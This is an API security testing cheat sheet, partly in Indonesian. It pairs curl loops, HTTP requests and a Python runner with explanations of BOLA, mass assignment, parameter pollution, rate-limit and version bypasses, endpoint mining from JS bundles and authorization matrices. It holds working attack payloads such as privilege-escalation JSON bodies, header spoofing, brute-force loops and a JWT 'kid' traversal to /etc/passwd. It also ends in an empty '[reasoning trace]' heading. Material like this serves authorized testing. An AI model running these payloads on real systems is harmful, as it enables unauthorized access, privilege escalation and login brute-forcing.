# api-sec — api

# API Security: Hunting Reference

## 1. BOLA (Broken Object Level Authorization)

**Concept:** Endpoint returns/modifies an object based on the `id` param without an ownership check.

**Baseline recon — UUID vs sequential:**
```bash
# Sequential
for i in $(seq 1 100); do
  curl -sk -H "Authorization: Bearer $T1" "https://api.target/v1/users/$i/orders" -o "/tmp/o_$i.json"
done
# Deteksi: respon 200 dengan order milik user lain = BOLA
```

**Swap-object test (dua akun):**
```http
GET /api/v1/invoices/550e8400-e29b-41d4-a716-446655440000 HTTP/2
Host: api.target
Authorization: Bearer <TOKEN_USER_A>
```
Expected: `403` jika authz benar. Muncul: `200 + body invoice user B` → BOLA.

**Nested/parent-child bypass** (authz is checked at the parent, not the child):
```http
GET /api/v1/orgs/111/projects/222/secrets/333 HTTP/2
Authorization: Bearer <TOKEN_USER_A>   # member org 111, bukan 222
```
Check whether the filter is only `orgs/111` in the path, but `projects/222` is not validated for its relation to 111.

**Method swap:** `GET` → `HEAD`, `PUT`, `PATCH`, `DELETE`. Often authz middleware only enforces on `GET`.

```http
PATCH /api/v1/users/777/profile HTTP/2
Content-Type: application/merge-patch+json
Authorization: Bearer <TOKEN_USER_A>

{"email":"attacker@x.tld"}
```

**Batch endpoint BOLA (GraphQL/persisted):**
```json
{"query":"query{user(id:\"7\"){email} u2:user(id:\"8\"){email}}"}
```
The `u2` alias often slips past per-response authz that only checks `data.user`.

**Heuristic bypass:** numeric id → add `0007`, `7.0`, `0x7`, `+7`, `7%00`, `7 OR 1=1` (if the query builder is naive). UUIDv4 returned at the `/me` endpoint often becomes a vector because they can be swapped with each other.

**Why it fails:** If the service uses an opaque ID derived from the session (e.g. HMAC `user_id` + resource) or Postgres 16 Row Level Security (`CREATE POLICY ... USING (owner = current_setting('app.uid'))`) — BOLA becomes invisible at the application layer.

---

## 2. Mass Assignment / Field Discovery

**What is sent:** A JSON body with additional fields that are not present in the UI.

```http
PATCH /api/v1/users/me HTTP/2
Content-Type: application/json
Authorization: Bearer <TOKEN>

{"email":"a@b.c","role":"admin","is_verified":true,"tenant_id":"00000000-0000-0000-0000-000000000000","balance":999999}
```

**Vulnerable framework patterns:**
| Framework | Vektor default |
|---|---|
| Rails 5.0+ / 7.1 | `permit!` or `params.require(:u).permit(:email)` missing a field |
| Laravel 9/10/11 | `$fillable` kosong + `$guarded=[]` |
| Django REST 3.15 | `fields = '__all__'` + empty `read_only` in ModelSerializer |
| Spring Boot 3.x | Jackson `ObjectMapper` without `@JsonIgnoreProperties`; `@ModelAttribute` binding |
| Marshmallow 3.x | `unknown=INCLUDE` |
| NestJS/class-validator | `whitelist:false` in `ValidationPipe` |

**Field discovery via OPTIONS:**
```http
OPTIONS /api/v1/users/me HTTP/2
```
Check `Allow:` (hidden methods) — but it rarely returns the schema. More useful:

```bash
curl -sk -X OPTIONS -I "https://api.target/api/v1/users" \
  | grep -Ei 'allow|access-control'
```

**Discovery via GraphQL introspection** (if it is not disabled):
```graphql
{__type(name:"User"){inputFields{name type{name kind ofType{name}}}}}
```
Or mutation `__schema` traversal. Look for `inputFields` that are not present in the UI (e.g. `isAdmin`, `accountTier`, `internalNotes`).

```bash
# via graphql-cop
graphql-cop -t https://api.target/graphql
```

**Discovery via JS bundle (SPA — React/Vue/Next.js 14):**
```bash
# Dump
curl -s https://app.target/ | grep -oE '/_next/static/[^"]+\.js' | sort -u | \
  xargs -I{} curl -s "https://app.target{}" -o -  >> /tmp/all.js

# Cari field name & endpoint
grep -oE '"[a-zA-Z_][a-zA-Z0-9_]{2,30}"' /tmp/all.js | sort -u > /tmp/id.txt
grep -oE '"/api/v[0-9]/[a-zA-Z0-9_/{}-]+"' /tmp/all.js | sort -u
```
Source maps (`.js.map`) aktif = jackpot:
```bash
curl -s https://app.target/_next/static/chunks/main-<hash>.js.map | jq -r '.sources[]'
```

**Discovery via error messages:** Send an empty `{}` or an unknown field — DRF returns `"field X is required"`, Spring returns `"Field error in object 'user' on field 'role'"`. Iterative enumeration.

**Why it works:** The ORM/deserializer binds all keys in the body to the model without a whitelist. **Fails** if: an explicit DTO (`class UserUpdateDTO` in Java), `express-validator` sanitization, or a `ModelSerializer` with comprehensive `read_only_fields`.

---

## 3. HTTP Parameter Pollution (HPP)

**What is sent:** Duplicate parameters to split the view between the proxy/WAF and the backend.

```http
POST /api/v1/transfer HTTP/2
Content-Type: application/x-www-form-urlencoded

amount=1&to=attacker&to=victim
```

| Stack | Perilaku |
|---|---|
| PHP 8.3 (default) | `to` = last value (`victim`) |
| Express 4.19 + `qs` | `to` = array `["attacker","victim"]` → sering crash/drop |
| Flask 3.0 (Werkzeug) | `request.args.get('to')` = **first** |
| ASP.NET Core 8 | Server-side model binder = **first**, WAF sering lihat **last** |
| nginx 1.25 `$arg_to` | only matches the first |

**Attack pattern — WAF sees safe, app sees evil:**
```
?amount=1&to=victim&to=attacker   → WAF query: to=victim|attacker (array), rules mungkin skip
```

**JSON variant:**
```http
{"role":"user","role":"admin"}
```
Jackson (Spring) default: last wins. `ObjectMapper` with `FAIL_ON_READING_DUP_TREE_KEY` = fail. Laravel `json_decode` = last wins. Python `json.loads` = last wins.

**Array-vs-scalar confusion (Express/Laravel):**
```http
POST /api/v1/comments HTTP/2
Content-Type: application/json

{"author":"x","author[]":"admin"}
```
Or form:
```
role[]=user&role[]=admin
```
If the backend uses `role in ['user','admin']` and the value becomes an array, the Python comparison `["admin"] in [...]` = False, but `in` in JS = a different truthy check.

**Why it works:** Different components (CDN → nginx → app) parse duplicate keys differently. **Fails** if the entire pipeline normalizes (e.g. nginx `$arg_x` + app parser are both first) or there is canonicalization at the API gateway (Kong 3.6 with the `request-validator` plugin).

---

## 4. Rate-Limit Bypass

**Identifikasi:** Set `X-RateLimit-Limit` / `Retry-After` header. Cek bucket key.

```bash
for i in $(seq 1 20); do curl -s -o /dev/null -w "%{http_code} %{time_total}\n" \
  -X POST https://api.target/v1/login -d 'user=a&pass=b'; done
```

**4a. X-Forwarded-For / client-IP header spoof:**
```http
POST /v1/login HTTP/2
X-Forwarded-For: 10.0.0.1
X-Real-IP: 10.0.0.1
Forwarded: for=10.0.0.1
X-Client-IP: 10.0.0.1
CF-Connecting-IP: 10.0.0.1
True-Client-IP: 10.0.0.1
```
Rotate per request. Nginx 1.25 `real_ip_module` — if `set_real_ip_from` is too broad (e.g. `0.0.0.0/0`), an attacker can spoof directly from the internet. Express default `trust proxy = false` = safe; if `true` without CIDR config, XFF is fully trusted.

**Detection:** Prove the bucket is keyed on the IP header:
```bash
# Req 1-10 dengan XFF sama → 429 di req ke-11
# Ulang dengan XFF increment → tidak pernah 429 = BUG
```

**4b. IPv6 rotation** (jika key = /64 tapi attacker punya /48):
```bash
for i in $(seq 1 100); do
  ip="2001:db8:$(printf '%x' $((RANDOM%65535))):$(printf '%x' $((RANDOM%65535)))::1"
  curl -s --interface $ip -X POST https://api.target/v1/login -d 'u=a&p=b'
done
```
Or use `proxy.py` + bind an IPv6 prefix. Cloud VPS / Vultr / Oracle Cloud often give a /64 at no cost.

**4c. Case variation (path / header):**
```
/v1/Login   /v1/LOGIN   /V1/login   /v1//login   /v1/./login   /v1/login/
/v1/login?x=1  /v1/login#a  /v1/login%00  /v1/login%2e
```
Many nginx `location = /v1/login` (exact) vs `location /v1/` — rate-limit rules in one block do not apply to another block.

**Header case:**
```
X-Forwarded-For  vs  x-forwarded-for  (HTTP/2 lowercase, tapi HTTP/1.1 mixed)
```
A WAF that matches strings case-sensitively can be bypassed.

**4d. Content-Type confusion:**
```http
POST /v1/login HTTP/2
Content-Type: application/json; charset=utf-8
```
vs `application/x-www-form-urlencoded` — some WAFs only inspect the JSON body.

**4e. Method variant & GraphQL:**
```
GET /v1/login?u=a&p=b        (jika GET login aktif — Mongo-style)
POST /graphql  {"query":"mutation{login(u:\"a\",p:\"b\"){token}}"}
```
GraphQL batch via alias or a `[{"query":...},{"query":...}]` array — many gateways count it as 1 request.

**Why it fails:** The bucket is keyed on `session_id` (after auth), or the rate limit is at a different layer (Cloudflare 2024 default rules + token bucket at the origin). IPv6 rotation fails if the origin enforces `key = /64` on the XFF sanitized to the original sender.

---

## 5. API Versioning Bypass

**What is sent:** Path/header variations to reach old versions or internal paths.

**Path matrix (fuzz paralel):**
```
/v1/users/7         /v2/users/7
/v1.0/users/7       /v0/users/7
/v1beta/users/7     /v1alpha/users/7
/v1/internal/users/7
/v1/admin/users/7
/v1/users/7?api-version=2023-01-01   (Azure ARM)
/v1/users/7?version=1
/_internal/v1/users/7
/api/v1/users/7  vs  /api/v2/users/7  vs  /api/users/7
/v1/users/7.1  /v1/users/7.0  /v1/users/07
```

**Header versioning (Send all at once):**
```http
GET /api/users/7 HTTP/2
Accept: application/vnd.target.v3+json
Accept-Version: 3.0
X-API-Version: v3
X-Version: 2024-01-01
API-Version: v3
```

**Bash sweeper:**
```bash
for v in v0 v1 v2 v3 v1beta v1alpha internal admin _internal _debug; do
  for p in users orders accounts invoices config; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $T" \
      "https://api.target/$v/$p")
    [ "$code" != "404" ] && echo "$code $v/$p"
  done
done
```

**Behavior sought:** `v1` is deprecated but still has weak authz; `v2` has the BOLA already fixed but the `v1` endpoint is still active. `/internal/*` often bypasses auth via mTLS that is disabled in dev, but prod accepts requests from the public because of a misconfigured network policy.

**nginx 1.25 `location` precedence:**
```
location /v1/ { ... }      # prefix
location = /v1/login { }    # exact — menang
location ~ ^/v1/ { }        # regex — bisa tidak cakup /v1/login
```
Look at `nginx -T` (if there is access) or probe with `OPTIONS *`.

**gRPC versioning:** `target.v1.Users/Get` vs `target.v2.Users/Get` via `grpcurl`:
```bash
grpcurl -H "authorization: Bearer $T" api.target:443 list
grpcurl -H "authorization: Bearer $T" api.target:443 list target.v1
```

**Why it fails:** API gateway (Kong/AWS API Gateway) `base_path_mapping` is strict — `/v1/*` is served by a completely different deployment service.

---

## 6. Undocumented Endpoint Mining from JS

**Step 1 — Inventory JS:**
```bash
# Next.js / Vite / CRA
curl -s https://app.target/ | grep -oE '(src|href)="[^"]+\.js[^"]*"' | cut -d'"' -f2 | sort -u
# Webpack manifest
curl -s https://app.target/asset-manifest.json
curl -s https://app.target/_next/static/$(date +%s)/_buildManifest.js
```

**Step 2 — Ekstrak endpoint + field:**
```bash
# Endpoint regex
grep -rhoE '"(/api|/v[0-9]|/graphql|/internal)[^"]{2,80}"' /tmp/all.js | sort -u

# Template literal
grep -rhoE '`/[a-zA-Z0-9_/-]+\$\{[^}]+\}[a-zA-Z0-9_/-]*`' /tmp/all.js

# fetch/axios call sites
grep -rhoE '\.(get|post|put|patch|delete)\(["`][^"`]+["`]' /tmp/all.js | sort -u
```

**Step 3 — Source map decompile (jika ada):**
```bash
curl -s https://app.target/_next/static/chunks/pages/_app-<hash>.js.map -o /tmp/m.map
npx source-map-explorer /tmp/m.map   # atau
node -e "const m=require('/tmp/m.map');console.log(m.sources.join('\n'))"
```
Or `sourcemapper -url https://app.target/main.js.map -output /tmp/src`.

**Step 4 — Webpack module dumping (jika inline):**
```bash
npx webpacksource /tmp/all.js /tmp/out
```

**Step 5 — Validate from JS to live:**
```bash
while read -r ep; do
  ep=${ep//\"/}
  [ "${ep:0:1}" = "/" ] || continue
  code=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $T" \
    "https://api.target${ep}")
  echo "$code $ep"
done < /tmp/endpoints.txt | grep -v 404
```

**Cari khusus:** `/_debug`, `/swagger`, `/openapi.json`, `/v2/api-docs`, `/actuator`, `/.well-known/`, `/__nextjs_original-stack-frame`, `/_next/data/*`.

**Next.js 14 trick:** `/_next/data/<buildId>/<route>.json` returns SSR props — leaks data that is not hydrated in the HTML:
```bash
curl -s "https://app.target/_next/data/<buildId>/admin/users.json" | jq
```

**Vite 5:** `import.meta.env` inlined — grep `VITE_` in the bundle to see all frontend secrets/variables.

**Why it fails:** The bundle is minified + endpoint strings are built at runtime (`['/','v','1'].join('')`) or via env (`process.env.REACT_APP_API`). Regex dies. Use the Chrome DevTools 131 **Coverage** panel (Ctrl+Shift+P → "Coverage") to extract the URLs actually fetched during the UI crawl.

---

## 7. Authz Matrix Testing

**Struktur matriks** — kombinasi (aktor × resource × action × method × versi):

| Actor \ Endpoint | `GET /v1/users/{id}` | `PATCH /v1/users/{id}` | `DELETE /v1/users/{id}` | `GET /v1/admin/users` |
|---|---|---|---|---|
| Anon | 401 | 401 | 401 | 401 |
| User A (self) | 200 | 200 | 200 (?) | 403 |
| User A (User B id) | **must be 403** | **must be 403** | **must be 403** | 403 |
| User A (A id, field `role=admin`) | 200 (field ignored) | **must be 200 without changing role** | — | 403 |
| Service token | — | — | — | 200 |
| Expired JWT | 401 | 401 | 401 | 401 |
| Algorithm=none | 401 | 401 | 401 | 401 |
| Token signed with a different `kid` | 401 | 401 | 401 | 401 |

**Runner (Python):**
```python
import httpx, itertools, csv

BASE = "https://api.target"
ACCOUNTS = {"A": TOKEN_A, "B": TOKEN_B, "anon": None}
TARGETS = [
    ("GET",    "/v1/users/7",      None),
    ("PATCH",  "/v1/users/7",      {"email":"x@y.z"}),
    ("DELETE", "/v1/users/7",      None),
    ("GET",    "/v1/admin/users",  None),
    ("POST",   "/v1/users/7/roles", {"role":"admin"}),
]
USER_A_ID, USER_B_ID = 1, 7

rows = []
with httpx.Client(verify=False, timeout=15) as c:
    for actor, tok in ACCOUNTS.items():
        for method, path, body in TARGETS:
            h = {"Authorization": f"Bearer {tok}"} if tok else {}
            r = c.request(method, BASE+path, headers=h, json=body)
            rows.append([actor, method, path, r.status_code, len(r.content)])

with open("matrix.csv","w",newline="") as f:
    csv.writer(f).writerows([["actor","method","path","code","len"],*rows])
```

**Automation — Authz0 / Autorize:**
- Burp **Autorize** 1.19: set session with User B, replay User A → highlight `200` on endpoints belonging to B.
- **AuthMatrix** (Burp BApp): definisikan role × endpoint, jalankan seluruh matrix.
- **Autorize** common false-positive: GET endpoint `/v1/users/7` returns `200` but body `{"detail":"not found"}` — always check `content-length` or response schema.

**Guardrail test:** send token with wrong `aud`, `exp` in the future (>1h), minimal `scope`, empty `kid`:

```bash
# Test JWT kid traversal (jika server fetch JWKS dari kid)
curl -s https://api.target/v1/users/7 -H \
  "Authorization: Bearer $(jwt-forge --alg RS256 --kid '../../etc/passwd' --sub 7)"
```

**Behavior sought:** consistent 401 vs 403; 200 with error body; 500 = unhandled exception in authz path (information); 200 with `Content-Type=text/html` = routing mismatch.

---

## 8. Operational Traps (Field-Failure Traps)

| Technique | Trap | Effect |
|---|---|---|
| BOLA via UUID | UUIDv7 (monotonic, time-based) in modern systems — not sequential, but **predictable** if you know the request clock | Enumeration becomes a 10^3 second window; previously considered safe → miss |
| Mass assignment | Framework enables `serialize` whitelist **by default** in new versions (Rails 7.1 `permit`, DRF 3.15 `read_only_fields` required) — test based on old assumption fails | False negative → report not created |
| HPP | nginx 1.25 `$arg_x` = **first**, but Kong 3.6 normalizes to **last** — testing only through one layer | Bug slips through because origin behavior differs from tunnel |
| XFF spoof | Cloudflare 2024 unconditional overwrite `CF-Connecting-IP` + `X-Forwarded-For` — spoof at edge is dead | Wasted time; verify `CF-*` headers first before testing |
| IPv6 rotation | Origin `key = ip/64` but VPS only has `/64` — rotation limited to 1 netblock, still hits the bucket | Limit detected but cannot be bypassed; look for `/48` (/56 for free v6 on Hetzner) |
| Rate limit | Bucket keyed on `Authorization` header hash — rotating IP has no effect | Requires many accounts; check `Set-Cookie`/`X-RateLimit-*` first |
| Case variation | HTTP/2 requires lowercase headers — `X-Forwarded-For` becomes `x-forwarded-for` on-wire; WAFs based on case-sensitive matching are dead | Request rejected or passes unexpectedly; use HTTP/1.1 for this test (`curl --http1.1`) |
| Version bypass | API gateway (AWS `stage`, Kong `route`) parses `/v1` as a **static path prefix** — `/v1/../v2/` is rejected 400 before nginx | Fuzzer disable redirect follow (`-L` off) to see 301 vs 400 vs 200 |
| JS mining | Chrome 131 DevTools **Coverage** only captures fetches after interaction; lazy-load pages are not covered | Rotate `navigator.userAgent`, run Selenium/Playwright with mobile viewport |
| Source map | Next.js 14 prod default `productionBrowserSourceMaps: false` — `.js.map` 404 | Don't rely on it; use de-minify (`webcrack`, `deobfuscator.io`) |
| Authz matrix | Authz tests run in parallel → rate limit 429 mid-run = invalid row | Serialize per actor + `Retry-After` sleep; save raw response for audit |
| All above | Reproduction in staging differs — staging often `NODE_ENV=development` with `trust proxy=true`, prod `false` (or vice versa) | Validate bug **only on target prod**, staging is only context |

**Cross-cutting:** always save **raw HTTP** (via Burp/mitmproxy log) not just `curl` output — differences in HTTP/1.1 vs HTTP/2, TLS SNI, and header ordering can be the only evidence a technique succeeded/failed. Retest with `curl --http1.1` and `--http2` before claiming.

---

## [reasoning trace]


